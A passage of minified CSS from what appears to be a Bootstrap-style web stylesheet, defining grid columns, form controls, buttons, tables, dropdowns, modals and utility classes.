66667%}.col-lg-offset-5{margin-left:20.83333%}.col-lg-offset-6{margin-left:25%}.col-lg-offset-7{margin-left:29.16667%}.col-lg-offset-8{margin-left:33.33333%}.col-lg-offset-9{margin-left:37.5%}.col-lg-offset-10{margin-left:41.66667%}.col-lg-offset-11{margin-left:45.83333%}.col-lg-offset-12{margin-left:50%}.col-lg-offset-13{margin-left:54.16667%}.col-lg-offset-14{margin-left:58.33333%}.col-lg-offset-15{margin-left:62.5%}.col-lg-offset-16{margin-left:66.66667%}.col-lg-offset-17{margin-left:70.83333%}.col-lg-offset-18{margin-left:75%}.col-lg-offset-19{margin-left:79.16667%}.col-lg-offset-20{margin-left:83.33333%}.col-lg-offset-21{margin-left:87.5%}.col-lg-offset-22{margin-left:91.66667%}.col-lg-offset-23{margin-left:95.83333%}.col-lg-offset-24{margin-left:100%}}@media (min-width:1400px){.col-xl-1,.col-xl-2,.col-xl-3,.col-xl-4,.col-xl-5,.col-xl-6,.col-xl-7,.col-xl-8,.col-xl-9,.col-xl-10,.col-xl-11,.col-xl-12,.col-xl-13,.col-xl-14,.col-xl-15,.col-xl-16,.col-xl-17,.col-xl-18,.col-xl-19,.col-xl-20,.col-xl-21,.col-xl-22,.col-xl-23,.col-xl-24{float:left}.col-xl-1{width:4.16667%}.col-xl-2{width:8.33333%}.col-xl-3{width:12.5%}.col-xl-4{width:16.66667%}.col-xl-5{width:20.83333%}.col-xl-6{width:25%}.col-xl-7{width:29.16667%}.col-xl-8{width:33.33333%}.col-xl-9{width:37.5%}.col-xl-10{width:41.66667%}.col-xl-11{width:45.83333%}.col-xl-12{width:50%}.col-xl-13{width:54.16667%}.col-xl-14{width:58.33333%}.col-xl-15{width:62.5%}.col-xl-16{width:66.66667%}.col-xl-17{width:70.83333%}.col-xl-18{width:75%}.col-xl-19{width:79.16667%}.col-xl-20{width:83.33333%}.col-xl-21{width:87.5%}.col-xl-22{width:91.66667%}.col-xl-23{width:95.83333%}.col-xl-24{width:100%}.col-xl-pull-0{right:auto}.col-xl-pull-1{right:4.16667%}.col-xl-pull-2{right:8.33333%}.col-xl-pull-3{right:12.5%}.col-xl-pull-4{right:16.66667%}.col-xl-pull-5{right:20.83333%}.col-xl-pull-6{right:25%}.col-xl-pull-7{right:29.16667%}.col-xl-pull-8{right:33.33333%}.col-xl-pull-9{right:37.5%}.col-xl-pull-10{right:41.66667%}.col-xl-pull-11{right:45.83333%}.col-xl-pull-12{right:50%}.col-xl-pull-13{right:54.16667%}.col-xl-pull-14{right:58.33333%}.col-xl-pull-15{right:62.5%}.col-xl-pull-16{right:66.66667%}.col-xl-pull-17{right:70.83333%}.col-xl-pull-18{right:75%}.col-xl-pull-19{right:79.16667%}.col-xl-pull-20{right:83.33333%}.col-xl-pull-21{right:87.5%}.col-xl-pull-22{right:91.66667%}.col-xl-pull-23{right:95.83333%}.col-xl-pull-24{right:100%}.col-xl-push-0{left:auto}.col-xl-push-1{left:4.16667%}.col-xl-push-2{left:8.33333%}.col-xl-push-3{left:12.5%}.col-xl-push-4{left:16.66667%}.col-xl-push-5{left:20.83333%}.col-xl-push-6{left:25%}.col-xl-push-7{left:29.16667%}.col-xl-push-8{left:33.33333%}.col-xl-push-9{left:37.5%}.col-xl-push-10{left:41.66667%}.col-xl-push-11{left:45.83333%}.col-xl-push-12{left:50%}.col-xl-push-13{left:54.16667%}.col-xl-push-14{left:58.33333%}.col-xl-push-15{left:62.5%}.col-xl-push-16{left:66.66667%}.col-xl-push-17{left:70.83333%}.col-xl-push-18{left:75%}.col-xl-push-19{left:79.16667%}.col-xl-push-20{left:83.33333%}.col-xl-push-21{left:87.5%}.col-xl-push-22{left:91.66667%}.col-xl-push-23{left:95.83333%}.col-xl-push-24{left:100%}.col-xl-offset-0{margin-left:0}.col-xl-offset-1{margin-left:4.16667%}.col-xl-offset-2{margin-left:8.33333%}.col-xl-offset-3{margin-left:12.5%}.col-xl-offset-4{margin-left:16.66667%}.col-xl-offset-5{margin-left:20.83333%}.col-xl-offset-6{margin-left:25%}.col-xl-offset-7{margin-left:29.16667%}.col-xl-offset-8{margin-left:33.33333%}.col-xl-offset-9{margin-left:37.5%}.col-xl-offset-10{margin-left:41.66667%}.col-xl-offset-11{margin-left:45.83333%}.col-xl-offset-12{margin-left:50%}.col-xl-offset-13{margin-left:54.16667%}.col-xl-offset-14{margin-left:58.33333%}.col-xl-offset-15{margin-left:62.5%}.col-xl-offset-16{margin-left:66.66667%}.col-xl-offset-17{margin-left:70.83333%}.col-xl-offset-18{margin-left:75%}.col-xl-offset-19{margin-left:79.16667%}.col-xl-offset-20{margin-left:83.33333%}.col-xl-offset-21{margin-left:87.5%}.col-xl-offset-22{margin-left:91.66667%}.col-xl-offset-23{margin-left:95.83333%}.col-xl-offset-24{margin-left:100%}}fieldset{padding:0;margin:0;border:0;min-width:0}legend{display:block;width:100%;padding:0;border:0}label{display:inline-block;max-width:100%}input[type="search"]{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}input[type="file"]{display:block}input[type="range"]{display:block;width:100%}select[multiple],select[size]{height:auto}input[type="file"]:focus,input[type="radio"]:focus,input[type="checkbox"]:focus{outline:thin dotted;outline-offset:-2px;outline:5px auto -webkit-focus-ring-color}output{display:block;padding-top:7px}.form-control{display:block;width:100%;background-image:none}textarea.form-control{height:auto}input[type="search"]{-webkit-appearance:none}input[type="date"],input[type="time"],input[type="datetime-local"],input[type="month"]{line-height:34px}.radio,.checkbox{position:relative;display:block}.radio label,.checkbox label{min-height:20px;margin-bottom:0;cursor:pointer}.radio.disabled label,fieldset[disabled] .radio label,.checkbox.disabled label,fieldset[disabled] .checkbox label{cursor:not-allowed}.help-block{display:block;margin-top:5px;margin-bottom:10px}@media (min-width:540px){.form-inline .form-group{display:inline-block;margin-bottom:0;vertical-align:middle}.form-inline .form-control{display:inline-block;width:auto;vertical-align:middle}.form-inline .input-group{display:inline-table;vertical-align:middle}.form-inline .input-group .input-group-addon,.form-inline .input-group .input-group-btn,.form-inline .input-group .form-control{width:auto}.form-inline .input-group>.form-control{width:100%}.form-inline .control-label{margin-bottom:0;vertical-align:middle}.form-inline .radio,.form-inline .checkbox{display:inline-block;margin-top:0;margin-bottom:0;vertical-align:middle}}input,button,textarea,select,option,progress{max-width:100%;line-height:inherit}.text-input,input[type="color"],input[type="date"],input[type="datetime"],input[type="datetime-local"],input[type="email"],input[type="month"],input[type="number"],input[type="password"],input[type="search"],input[type="tel"],input[type="text"],input[type="time"],input[type="url"],input[type="week"],textarea{padding:4px 8px;border-style:solid;border-width:2px;border-color:rgba(0,0,0,0.4);background-color:rgba(255,255,255,0.4);height:32px;height:2rem}.text-input-focus,input[type="color"]:focus,input[type="date"]:focus,input[type="datetime"]:focus,input[type="datetime-local"]:focus,input[type="email"]:focus,input[type="month"]:focus,input[type="number"]:focus,input[type="password"]:focus,input[type="search"]:focus,input[type="tel"]:focus,input[type="text"]:focus,input[type="time"]:focus,input[type="url"]:focus,input[type="week"]:focus,textarea:focus{border-color:#0067b8;background-color:#fff}.text-input-moz-placeholder,input[type="color"]::-moz-placeholder,input[type="date"]::-moz-placeholder,input[type="datetime"]::-moz-placeholder,input[type="datetime-local"]::-moz-placeholder,input[type="email"]::-moz-placeholder,input[type="month"]::-moz-placeholder,input[type="number"]::-moz-placeholder,input[type="password"]::-moz-placeholder,input[type="search"]::-moz-placeholder,input[type="tel"]::-moz-placeholder,input[type="text"]::-moz-placeholder,input[type="time"]::-moz-placeholder,input[type="url"]::-moz-placeholder,input[type="week"]::-moz-placeholder,textarea::-moz-placeholder{color:rgba(0,0,0,0.6);opacity:1}.text-input-ms-placeholder,input[type="color"]:-ms-input-placeholder,input[type="date"]:-ms-input-placeholder,input[type="datetime"]:-ms-input-placeholder,input[type="datetime-local"]:-ms-input-placeholder,input[type="email"]:-ms-input-placeholder,input[type="month"]:-ms-input-placeholder,input[type="number"]:-ms-input-placeholder,input[type="password"]:-ms-input-placeholder,input[type="search"]:-ms-input-placeholder,input[type="tel"]:-ms-input-placeholder,input[type="text"]:-ms-input-placeholder,input[type="time"]:-ms-input-placeholder,input[type="url"]:-ms-input-placeholder,input[type="week"]:-ms-input-placeholder,textarea:-ms-input-placeholder{color:rgba(0,0,0,0.6)}.text-input-webkit-placeholder,input[type="color"]::-webkit-input-placeholder,input[type="date"]::-webkit-input-placeholder,input[type="datetime"]::-webkit-input-placeholder,input[type="datetime-local"]::-webkit-input-placeholder,input[type="email"]::-webkit-input-placeholder,input[type="month"]::-webkit-input-placeholder,input[type="number"]::-webkit-input-placeholder,input[type="password"]::-webkit-input-placeholder,input[type="search"]::-webkit-input-placeholder,input[type="tel"]::-webkit-input-placeholder,input[type="text"]::-webkit-input-placeholder,input[type="time"]::-webkit-input-placeholder,input[type="url"]::-webkit-input-placeholder,input[type="week"]::-webkit-input-placeholder,textarea::-webkit-input-placeholder{color:rgba(0,0,0,0.6)}.text-input-disabled,input[type="color"][disabled],input[type="color"][readonly],fieldset[disabled] input[type="color"],input[type="date"][disabled],input[type="date"][readonly],fieldset[disabled] input[type="date"],input[type="datetime"][disabled],input[type="datetime"][readonly],fieldset[disabled] input[type="datetime"],input[type="datetime-local"][disabled],input[type="datetime-local"][readonly],fieldset[disabled] input[type="datetime-local"],input[type="email"][disabled],input[type="email"][readonly],fieldset[disabled] input[type="email"],input[type="month"][disabled],input[type="month"][readonly],fieldset[disabled] input[type="month"],input[type="number"][disabled],input[type="number"][readonly],fieldset[disabled] input[type="number"],input[type="password"][disabled],input[type="password"][readonly],fieldset[disabled] input[type="password"],input[type="search"][disabled],input[type="search"][readonly],fieldset[disabled] input[type="search"],input[type="tel"][disabled],input[type="tel"][readonly],fieldset[disabled] input[type="tel"],input[type="text"][disabled],input[type="text"][readonly],fieldset[disabled] input[type="text"],input[type="time"][disabled],input[type="time"][readonly],fieldset[disabled] input[type="time"],input[type="url"][disabled],input[type="url"][readonly],fieldset[disabled] input[type="url"],input[type="week"][disabled],input[type="week"][readonly],fieldset[disabled] input[type="week"],textarea[disabled],textarea[readonly],fieldset[disabled] textarea{border-color:#ccc !important;background-color:rgba(0,0,0,0.2) !important;color:rgba(0,0,0,0.2) !important}.text-input-has-error,.form-group.has-error input[type="color"],input[type="color"].has-error,.form-group.has-error input[type="date"],input[type="date"].has-error,.form-group.has-error input[type="datetime"],input[type="datetime"].has-error,.form-group.has-error input[type="datetime-local"],input[type="datetime-local"].has-error,.form-group.has-error input[type="email"],input[type="email"].has-error,.form-group.has-error input[type="month"],input[type="month"].has-error,.form-group.has-error input[type="number"],input[type="number"].has-error,.form-group.has-error input[type="password"],input[type="password"].has-error,.form-group.has-error input[type="search"],input[type="search"].has-error,.form-group.has-error input[type="tel"],input[type="tel"].has-error,.form-group.has-error input[type="text"],input[type="text"].has-error,.form-group.has-error input[type="time"],input[type="time"].has-error,.form-group.has-error input[type="url"],input[type="url"].has-error,.form-group.has-error input[type="week"],input[type="week"].has-error,.form-group.has-error textarea,textarea.has-error{border-color:#e81123}textarea{height:auto}input::-ms-clear,input::-ms-reveal{height:100%;padding:4px 8px;margin-right:-8px;margin-left:4px}input::-ms-clear:hover,input::-ms-reveal:hover{color:#0067b8}input::-ms-clear:active,input::-ms-reveal:active{color:#fff;background-color:#0067b8}.form-group.has-error input::-ms-clear:hover,.form-group.has-error input::-ms-reveal:hover,input.has-error::-ms-clear:hover,input.has-error::-ms-reveal:hover{color:#e81123}.form-group.has-error input::-ms-clear:active,.form-group.has-error input::-ms-reveal:active,input.has-error::-ms-clear:active,input.has-error::-ms-reveal:active{color:#fff;background-color:#e81123}input[type="radio"]{width:20px;height:20px}input[type="radio"]::-ms-check{background-color:#fff;color:#000;border-style:solid;border-width:2px;border-color:rgba(0,0,0,0.6)}input[type="radio"]:checked::-ms-check{color:#000;border-color:#0067b8}input[type="radio"]:hover::-ms-check{border-color:#000}input[type="radio"]:hover:checked::-ms-check{border-color:#0067b8}input[type="radio"]:active::-ms-check{color:rgba(0,0,0,0.6);border-color:rgba(0,0,0,0.6)}input[type="radio"]:active:checked::-ms-check{border-color:rgba(0,0,0,0.6)}input[type="radio"][disabled]::-ms-check,fieldset[disabled] input[type="radio"]::-ms-check{background-color:#fff !important;color:rgba(0,0,0,0.2) !important;border-color:rgba(0,0,0,0.2) !important}input[type="radio"][disabled]:checked::-ms-check,fieldset[disabled] input[type="radio"]:checked::-ms-check{color:rgba(0,0,0,0.2) !important}input[type="checkbox"]{width:20px;height:20px}input[type="checkbox"]::-ms-check{border-style:solid;border-width:2px;background-color:transparent;color:#000;border-color:rgba(0,0,0,0.8)}input[type="checkbox"]:checked::-ms-check{background-color:#0067b8;border-color:#0067b8}input[type="checkbox"]:hover::-ms-check{border-color:#000}input[type="checkbox"]:active::-ms-check{background-color:rgba(0,0,0,0.6);border-color:transparent}input[type="checkbox"][disabled]::-ms-check,fieldset[disabled] input[type="checkbox"]::-ms-check{border-color:rgba(0,0,0,0.2) !important;background-color:transparent !important;color:rgba(0,0,0,0.2) !important}progress{height:4px;border-style:none;color:#0067b8;background-color:#ccc;-webkit-appearance:none;display:block}progress::-ms-fill{color:#0067b8}progress::-webkit-progress-value{background-color:#0067b8}progress::-webkit-progress-bar{background-color:#ccc}progress::-moz-progress-bar{background-color:#0067b8}input[type="range"]{height:42px;padding-bottom:16px;padding-top:16px;border-style:none}input[type="range"]::-ms-track{height:2px;border-style:none;background-color:transparent;color:transparent}input[type="range"]::-ms-fill-lower{background-color:#0067b8}input[type="range"]::-ms-fill-upper{background-color:rgba(0,0,0,0.4)}input[type="range"]::-ms-thumb{background-color:#0067b8;width:24px;height:8px;border-radius:4px;border-style:none}input[type="range"]:hover::-ms-thumb{background-color:#1f1f1f}input[type="range"]:active::-ms-thumb{background-color:#ccc}input[type="range"]:disabled::-ms-fill-lower,input[type="range"]:disabled::-ms-fill-upper{background-color:rgba(0,0,0,0.2) !important}input[type="range"]:disabled::-ms-thumb{background-color:#ccc !important}legend{margin-bottom:12px}.form-group{margin-bottom:12px}.form-group label{margin-top:0;margin-bottom:8px}.radio,.checkbox{margin-top:12px;margin-bottom:12px}.radio label,.checkbox label{padding-left:28px}.radio input[type="radio"],.radio-inline input[type="radio"],.checkbox input[type="checkbox"],.checkbox-inline input[type="checkbox"]{position:absolute;margin-left:-28px}input[type="radio"][disabled],input[type="radio"].disabled,fieldset[disabled] input[type="radio"],input[type="checkbox"][disabled],input[type="checkbox"].disabled,fieldset[disabled] input[type="checkbox"]{cursor:not-allowed}input[type="radio"][disabled] span,input[type="radio"].disabled span,fieldset[disabled] input[type="radio"] span,input[type="checkbox"][disabled] span,input[type="checkbox"].disabled span,fieldset[disabled] input[type="checkbox"] span{color:rgba(0,0,0,0.2)}select{border:2px solid rgba(0,0,0,0.4);background-clip:padding-box;color:#000}select:focus option{background-color:#fff}select:hover{border-color:rgba(0,0,0,0.6)}select:active{background-color:#fff}select[multiple]:focus{background-color:#fff}select[disabled],select.disabled,fieldset[disabled] select{cursor:not-allowed;background-color:rgba(0,0,0,0.2) !important;border-color:rgba(0,0,0,0.2) !important;color:rgba(0,0,0,0.6) !important}select[disabled] option:hover,select[disabled] option:focus,select[disabled] option:active,select.disabled option:hover,select.disabled option:focus,select.disabled option:active,fieldset[disabled] select option:hover,fieldset[disabled] select option:focus,fieldset[disabled] select option:active{background-color:transparent !important}::-ms-expand{margin:0 6px 0 20px;background-color:transparent;border:0}.btn-block{display:block;width:100%}.btn-block .btn-block{margin-top:5px}input[type="submit"].btn-block,input[type="reset"].btn-block,input[type="button"].btn-block{width:100%}.btn,button,input[type="button"],input[type="submit"],input[type="reset"]{display:inline-block;min-width:100px;padding:4px 12px 4px 12px;margin-top:4px;margin-bottom:4px;position:relative;max-width:100%;text-align:center;white-space:nowrap;overflow:hidden;vertical-align:middle;text-overflow:ellipsis;touch-action:manipulation;color:#000;border-style:solid;border-width:2px;border-color:transparent;background-color:rgba(0,0,0,0.2)}.btn:hover,.btn:focus,button:hover,button:focus,input[type="button"]:hover,input[type="button"]:focus,input[type="submit"]:hover,input[type="submit"]:focus,input[type="reset"]:hover,input[type="reset"]:focus{border-color:rgba(0,0,0,0.4)}.btn:hover,button:hover,input[type="button"]:hover,input[type="submit"]:hover,input[type="reset"]:hover{cursor:pointer}.btn:active,button:active,input[type="button"]:active,input[type="submit"]:active,input[type="reset"]:active{background-color:rgba(0,0,0,0.4);border-color:transparent}.btn.btn-primary,button.btn-primary,input[type="button"].btn-primary,input[type="submit"].btn-primary,input[type="reset"].btn-primary{background-color:#0067b8;border-color:#0067b8;color:#fff}.btn.btn-primary:hover,.btn.btn-primary:focus,button.btn-primary:hover,button.btn-primary:focus,input[type="button"].btn-primary:hover,input[type="button"].btn-primary:focus,input[type="submit"].btn-primary:hover,input[type="submit"].btn-primary:focus,input[type="reset"].btn-primary:hover,input[type="reset"].btn-primary:focus{border-color:#004e8c}.btn.btn-primary:active,button.btn-primary:active,input[type="button"].btn-primary:active,input[type="submit"].btn-primary:active,input[type="reset"].btn-primary:active{background-color:rgba(0,0,0,0.4);border-color:transparent}.btn.disabled,.btn[disabled],fieldset[disabled] .btn,button.disabled,button[disabled],fieldset[disabled] button,input[type="button"].disabled,input[type="button"][disabled],fieldset[disabled] input[type="button"],input[type="submit"].disabled,input[type="submit"][disabled],fieldset[disabled] input[type="submit"],input[type="reset"].disabled,input[type="reset"][disabled],fieldset[disabled] input[type="reset"]{cursor:not-allowed;pointer-events:none;outline:none;color:rgba(0,0,0,0.2) !important;border-color:transparent !important;background-color:rgba(0,0,0,0.2) !important}a.btn:link,a.btn:visited{color:#000}a.btn.btn-primary:link,a.btn.btn-primary:visited{color:#fff}.person{border-radius:50%;display:block;padding:4px;border:1px dotted transparent}.person .person-graphic{display:block;background-size:cover;background-position:center center;background-repeat:no-repeat;border-radius:50%}.person.person-small{width:54px;height:54px}.person.person-small .person-graphic{width:44px;height:44px}.person.person-medium{width:110px;height:110px}.person.person-medium .person-graphic{width:100px;height:100px}.person.person-large{width:210px;height:210px}.person.person-large .person-graphic{width:200px;height:200px}.person:focus{outline-style:none;border-color:#000}table{background-color:transparent}th{text-align:left}.table{width:100%;max-width:100%}.table>thead>tr>th,.table>thead>tr>td,.table>tbody>tr>th,.table>tbody>tr>td,.table>tfoot>tr>th,.table>tfoot>tr>td{padding:16px;vertical-align:top}.table>thead>tr>th{vertical-align:bottom}.table>caption thead>tr:first-child>th,.table>caption thead>tr:first-child>td,.table>colgroup thead>tr:first-child>th,.table>colgroup thead>tr:first-child>td,.table>thead:first-child>tr:first-child>th,.table>thead:first-child>tr:first-child>td{border-top:0}table col[class*="col-"]{position:static;float:none;display:table-column}table td[class*="col-"],table th[class*="col-"]{position:static;float:none;display:table-cell}.table-responsive{overflow-x:auto;min-height:.01%}@media screen and (max-width:539px){.table-responsive{width:100%;margin-bottom:15px;overflow-y:hidden;-ms-overflow-style:-ms-autohiding-scrollbar}.table-responsive>.table{margin-bottom:0}.table-responsive>.table>thead>tr>th,.table-responsive>.table>thead>tr>td,.table-responsive>.table>tbody>tr>th,.table-responsive>.table>tbody>tr>td,.table-responsive>.table>tfoot>tr>th,.table-responsive>.table>tfoot>tr>td{white-space:nowrap}}.table>thead>tr>th{font-size:12px;line-height:14px;font-weight:400;font-size:.75rem;line-height:.875rem;padding-bottom:1.1816px;padding-top:1.1816px;padding:0 16px 10px 16px}.table>thead>tr>th.text-maxlines-1{white-space:nowrap;text-overflow:ellipsis;max-height:16.3632px;max-height:1.0227rem}.table>thead>tr>th.text-maxlines-2{max-height:30.3632px;max-height:1.8977rem}.table>thead>tr>th.text-maxlines-3{max-height:44.3632px;max-height:2.7727rem}.table>thead>tr>th.text-maxlines-4{max-height:58.3632px;max-height:3.6477rem}.table>tbody>tr:nth-child(odd){background-color:#f2f2f2}.section{margin-top:30px;margin-bottom:30px}@media (min-width:320px){.section{margin-top:42px;margin-bottom:42px}}.section .section-header{padding-bottom:10px;border-bottom:1px solid #e6e6e6;margin-bottom:16px}@media (min-width:320px){.section .section-header{margin-bottom:32px}}.section .section-title{display:block;margin-top:0;margin-bottom:0;font-size:15px;line-height:20px;font-weight:600;font-size:.9375rem;line-height:1.25rem;padding-bottom:.227px;padding-top:.227px;color:#000}.section .section-title.text-maxlines-1{white-space:nowrap;text-overflow:ellipsis;max-height:20.454px;max-height:1.27838rem}.section .section-title.text-maxlines-2{max-height:40.454px;max-height:2.52838rem}.section .section-title.text-maxlines-3{max-height:60.454px;max-height:3.77838rem}.section .section-title.text-maxlines-4{max-height:80.454px;max-height:5.02838rem}@media (min-width:320px){.section .section-title{font-size:24px;line-height:28px;font-weight:300;font-size:1.5rem;line-height:1.75rem;padding-bottom:2.3632px;padding-top:2.3632px}.section .section-title.text-maxlines-1{white-space:nowrap;text-overflow:ellipsis;max-height:32.7264px;max-height:2.0454rem}.section .section-title.text-maxlines-2{max-height:60.7264px;max-height:3.7954rem}.section .section-title.text-maxlines-3{max-height:88.7264px;max-height:5.5454rem}.section .section-title.text-maxlines-4{max-height:116.7264px;max-height:7.2954rem}}.section .section-subtitle{display:block;font-size:15px;line-height:20px;font-weight:400;font-size:.9375rem;line-height:1.25rem;padding-bottom:.227px;padding-top:.227px;color:#767676}.section .section-subtitle.text-maxlines-1{white-space:nowrap;text-overflow:ellipsis;max-height:20.454px;max-height:1.27838rem}.section .section-subtitle.text-maxlines-2{max-height:40.454px;max-height:2.52838rem}.section .section-subtitle.text-maxlines-3{max-height:60.454px;max-height:3.77838rem}.section .section-subtitle.text-maxlines-4{max-height:80.454px;max-height:5.02838rem}.section .header-action{display:table-cell;vertical-align:bottom;white-space:nowrap;font-size:12px;line-height:14px;font-weight:400;font-size:.75rem;line-height:.875rem;padding-bottom:1.1816px;padding-top:1.1816px}.section .header-action.text-maxlines-1{white-space:nowrap;text-overflow:ellipsis;max-height:16.3632px;max-height:1.0227rem}.section .header-action.text-maxlines-2{max-height:30.3632px;max-height:1.8977rem}.section .header-action.text-maxlines-3{max-height:44.3632px;max-height:2.7727rem}.section .header-action.text-maxlines-4{max-height:58.3632px;max-height:3.6477rem}.section p{margin-top:12px;margin-bottom:12px}.section p .more-container{display:block;margin-top:6px}.section .btn-group{margin-top:20px;margin-bottom:20px}.section.remove-header-rule>.section-header{border-style:none}.section.has-header-action .header-titles{display:table-cell}.section.has-header-action .titles-outer{display:table;table-layout:fixed;width:100%}.section.has-header-action .titles-inner{display:table-cell;padding-right:10px}.section.item-section{margin-bottom:32px}.section.item-section .section-header{margin-bottom:16px;border-style:none;padding-bottom:0}.section.item-section .section-title{color:#000;font-size:15px;line-height:20px;font-weight:600;font-size:.9375rem;line-height:1.25rem;padding-bottom:.227px;padding-top:.227px}.section.item-section .section-title.text-maxlines-1{white-space:nowrap;text-overflow:ellipsis;max-height:20.454px;max-height:1.27838rem}.section.item-section .section-title.text-maxlines-2{max-height:40.454px;max-height:2.52838rem}.section.item-section .section-title.text-maxlines-3{max-height:60.454px;max-height:3.77838rem}.section.item-section .section-title.text-maxlines-4{max-height:80.454px;max-height:5.02838rem}.caret{display:inline-block;width:0;height:0;margin-left:2px;vertical-align:middle;border-top:4px solid;border-right:4px solid transparent;border-left:4px solid transparent}.dropdown{position:relative}.dropdown-toggle:focus{outline:0}.dropdown-menu{position:absolute;top:100%;left:0;z-index:1000;display:none;float:left;min-width:160px;padding:5px 0;margin:2px 0 0;list-style:none;font-size:14px;text-align:left;background-color:#fff;border:1px solid #ccc;border:1px solid rgba(0,0,0,0.15);border-radius:4px;-webkit-box-shadow:0 6px 12px rgba(0,0,0,0.175);box-shadow:0 6px 12px rgba(0,0,0,0.175);background-clip:padding-box}.dropdown-menu.pull-right{right:0;left:auto}.dropdown-menu .divider{height:1px;margin:9px 0;overflow:hidden;background-color:#e5e5e5}.dropdown-menu>li>a{display:block;padding:3px 20px;clear:both;font-weight:normal;line-height:1.42857;color:#333;white-space:nowrap}.dropdown-menu>li>a:hover,.dropdown-menu>li>a:focus{text-decoration:none;color:#262626;background-color:#f5f5f5}.dropdown-menu>.active>a,.dropdown-menu>.active>a:hover,.dropdown-menu>.active>a:focus{color:#fff;text-decoration:none;outline:0;background-color:#428bca}.dropdown-menu>.disabled>a,.dropdown-menu>.disabled>a:hover,.dropdown-menu>.disabled>a:focus{color:#777}.dropdown-menu>.disabled>a:hover,.dropdown-menu>.disabled>a:focus{text-decoration:none;background-color:transparent;background-image:none;filter:progid:DXImageTransform.Microsoft.gradient(enabled=false);cursor:not-allowed}.open>.dropdown-menu{display:block}.open>a{outline:0}.dropdown-menu-right{left:auto;right:0}.dropdown-menu-left{left:0;right:auto}.dropdown-header{display:block;padding:3px 20px;font-size:12px;line-height:1.42857;color:#777;white-space:nowrap}.dropdown-backdrop{position:fixed;left:0;right:0;bottom:0;top:0;z-index:990}.pull-right>.dropdown-menu{right:0;left:auto}.dropup .caret,.navbar-fixed-bottom .dropdown .caret{border-top:0;border-bottom:4px solid;content:""}.dropup .dropdown-menu,.navbar-fixed-bottom .dropdown .dropdown-menu{top:auto;bottom:100%;margin-bottom:1px}@media (min-width:768px){.navbar-right .dropdown-menu{right:0;left:auto}.navbar-right .dropdown-menu-left{left:0;right:auto}}[data-toggle="buttons"]>.btn input[type="radio"],[data-toggle="buttons"]>.btn input[type="checkbox"],[data-toggle="buttons"]>.btn-group>.btn input[type="radio"],[data-toggle="buttons"]>.btn-group>.btn input[type="checkbox"]{position:absolute;clip:rect(0, 0, 0, 0);pointer-events:none}.btn-group:before,.btn-group:after{content:" ";display:table}.btn-group:after{clear:both}.btn-group .btn{float:left;margin-right:4px}.input-group{position:relative;display:table;border-collapse:separate}.input-group[class*="col-"]{float:none;padding-left:0;padding-right:0}.input-group .form-control{position:relative;z-index:2;float:left;width:100%;margin-bottom:0}.input-group-addon,.input-group-btn,.input-group .form-control{display:table-cell}.input-group-addon:not(:first-child):not(:last-child),.input-group-btn:not(:first-child):not(:last-child),.input-group .form-control:not(:first-child):not(:last-child){border-radius:0}.input-group-addon,.input-group-btn{width:1%;white-space:nowrap;vertical-align:middle}.input-group-addon{padding:6px 12px;font-size:14px;font-weight:normal;line-height:1;color:#555;text-align:center;background-color:#eee;border:1px solid #ccc;border-radius:4px}.input-group-addon.input-sm,.input-group-sm>.input-group-addon,.input-group-sm>.input-group-btn>.input-group-addon.btn{padding:5px 10px;font-size:12px;border-radius:3px}.input-group-addon.input-lg,.input-group-lg>.input-group-addon,.input-group-lg>.input-group-btn>.input-group-addon.btn{padding:10px 16px;font-size:18px;border-radius:6px}.input-group-addon input[type="radio"],.input-group-addon input[type="checkbox"]{margin-top:0}.input-group .form-control:first-child,.input-group-addon:first-child,.input-group-btn:first-child>.btn,.input-group-btn:first-child>.btn-group>.btn,.input-group-btn:first-child>.dropdown-toggle,.input-group-btn:last-child>.btn:not(:last-child):not(.dropdown-toggle),.input-group-btn:last-child>.btn-group:not(:last-child)>.btn{border-bottom-right-radius:0;border-top-right-radius:0}.input-group-addon:first-child{border-right:0}.input-group .form-control:last-child,.input-group-addon:last-child,.input-group-btn:last-child>.btn,.input-group-btn:last-child>.btn-group>.btn,.input-group-btn:last-child>.dropdown-toggle,.input-group-btn:first-child>.btn:not(:first-child),.input-group-btn:first-child>.btn-group:not(:first-child)>.btn{border-bottom-left-radius:0;border-top-left-radius:0}.input-group-addon:last-child{border-left:0}.input-group-btn{position:relative;font-size:0;white-space:nowrap}.input-group-btn>.btn{position:relative}.input-group-btn>.btn .btn{margin-left:-1px}.input-group-btn>.btn:hover,.input-group-btn>.btn:focus,.input-group-btn>.btn:active{z-index:2}.input-group-btn:first-child>.btn,.input-group-btn:first-child>.btn-group{margin-right:-1px}.input-group-btn:last-child>.btn,.input-group-btn:last-child>.btn-group{margin-left:-1px}.alert{margin-bottom:8px;margin-top:8px}.alert-error{color:#e81123}.modal-open{overflow:hidden}.modal{display:none;overflow:hidden;position:fixed;top:0;right:0;bottom:0;left:0;z-index:1040;-webkit-overflow-scrolling:touch;outline:0}.modal-open .modal{overflow-x:hidden;overflow-y:auto}.modal-dialog{position:relative;width:auto}.modal-content{position:relative;background-color:#fff;background-clip:padding-box;outline:0}.modal-backdrop{position:fixed;top:0;right:0;bottom:0;left:0;background-color:#000}.modal-backdrop.fade{opacity:0;filter:alpha(opacity=0)}.modal-backdrop.in{opacity:.5;filter:alpha(opacity=50)}.modal-header{min-height:16.42857px}.modal-title{margin:0;line-height:1.42857}.modal-body{position:relative}.modal-footer:before,.modal-footer:after{content:" ";display:table}.modal-footer:after{clear:both}.modal-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}@media (min-width:540px){.modal-dialog{width:600px}.modal-sm{width:300px}}@media (min-width:768px){.modal-lg{width:900px}}.modal .modal-dialog{margin:50vh auto;-webkit-transform:translate(0, -50%);-ms-transform:translate(0, -50%);-o-transform:translate(0, -50%);transform:translate(0, -50%);border:2px solid #0067b8}.modal .modal-content{padding:16px}.modal p:first-child{margin-top:0}.modal .btn{width:calc(48%)}.modal .btn:last-child{margin-right:0}.modal .btn:only-child{float:right}.modal .modal-footer{margin-top:24px}.tooltip{position:absolute;z-index:1070;display:block;visibility:visible}.tooltip-inner{text-decoration:none}.tooltip .tooltip-inner{background:#f2f2f2;color:#000;border:1px solid #ccc;padding:5px 8px 7px 8px;max-width:320px}.clearfix:before,.clearfix:after{content:" ";display:table}.clearfix:after{clear:both}.center-block{display:block;margin-left:auto;margin-right:auto}.hide{display:none !important}.show{display:block !important}.invisible{visibility:hidden}.text-hide{font:0/0 a;color:transparent;text-shadow:none;background-color:transparent;border:0}.hidden{display:none !important;visibility:hidden !important}.affix{position:fixed}.pull-right{float:right !important}.pull-left{float:left 